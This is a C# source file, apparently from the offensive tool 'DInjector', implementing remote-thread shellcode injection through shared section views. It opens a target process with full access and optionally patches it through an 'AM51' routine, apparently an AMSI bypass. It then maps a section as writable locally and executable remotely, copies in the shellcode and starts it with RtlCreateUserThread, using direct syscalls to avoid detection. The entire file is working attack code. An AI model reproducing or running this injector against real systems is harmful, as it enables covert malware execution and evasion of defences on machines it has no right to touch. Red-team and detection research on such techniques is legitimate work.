using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class RemoteThreadView
    {
        public static void Execute(byte[] shellcode, int processID, bool remoteAm51, bool forceAm51, bool debug = false)
        {
            #region NtOpenProcess

            IntPtr rhProcess = IntPtr.Zero;
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)processID };

            var ntstatus = Syscalls.NtOpenProcess(
                ref rhProcess,
                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadView) [+] NtOpenProcess");
            else
                throw new Exception($"(RemoteThreadView) [-] NtOpenProcess: {ntstatus}");

            if (remoteAm51)
                AM51.Patch(
                    processHandle: rhProcess,
                    processID: processID,
                    force: forceAm51);

            #endregion

            #region NtCreateSection (PAGE_EXECUTE_READWRITE)

            // Create RWX memory section for the shellcode

            var hSection = IntPtr.Zero;
            var maxSize = (uint)shellcode.Length;

            ntstatus = Syscalls.NtCreateSection(
                ref hSection,
                DI.Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_READ | DI.Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_WRITE | DI.Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_EXECUTE,
                IntPtr.Zero,
                ref maxSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                DI.Data.Win32.WinNT.SEC_COMMIT,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadView) [+] NtCreateSection, PAGE_EXECUTE_READWRITE");
            else
                throw new Exception($"(RemoteThreadView) [-] NtCreateSection, PAGE_EXECUTE_READWRITE: {ntstatus}");

            #endregion

            #region NtMapViewOfSection (PAGE_READWRITE)

            // Map the view of created section into the LOCAL process's virtual address space (as RW)

            IntPtr lhProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            var lbaseAddress = IntPtr.Zero;
            ulong sectionOffset = 0;
            maxSize = 0;

            ntstatus = Syscalls.NtMapViewOfSection(
                hSection,
                lhProcess,
                ref lbaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                ref sectionOffset,
                ref maxSize,
                2, // InheritDisposition
                0, // AllocationType
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_READWRITE");
            else
                throw new Exception($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtMapViewOfSection (PAGE_EXECUTE_READ)

            // Map the view of (the same) created section into the REMOTE process's virtual address space (as RX)

            var rbaseAddress = IntPtr.Zero;
            sectionOffset = 0;
            maxSize = 0;

            ntstatus = Syscalls.NtMapViewOfSection(
                hSection,
                rhProcess,
                ref rbaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                ref sectionOffset,
                ref maxSize,
                2, // InheritDisposition
                0, // AllocationType
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_EXECUTE_READ");
            else
                throw new Exception($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_EXECUTE_READ: {ntstatus}");

            // Copy the shellcode into the locally mapped view which will be reflected on the remotely mapped view
            Marshal.Copy(shellcode, 0, lbaseAddress, shellcode.Length);

            #endregion

            #region RtlCreateUserThread

            // Execute the shellcode in a remote thread

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Win32.RtlCreateUserThread(
                rhProcess,
                IntPtr.Zero,
                false, // CreateSuspended
                0, // StackZeroBits
                IntPtr.Zero,
                IntPtr.Zero,
                rbaseAddress,
                IntPtr.Zero,
                ref hThread,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadView) [+] RtlCreateUserThread");
            else
                throw new Exception($"(RemoteThreadView) [-] RtlCreateUserThread: {ntstatus}");

            #endregion

            #region NtUnmapViewOfSection

            ntstatus = Syscalls.NtUnmapViewOfSection(
                lhProcess,
                lbaseAddress);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadView) [+] NtUnmapViewOfSection");
            else
                throw new Exception($"(RemoteThreadView) [-] NtUnmapViewOfSection: {ntstatus}");

            #endregion

            Syscalls.NtClose(hSection);
            Syscalls.NtClose(rhProcess);
        }
    }
}
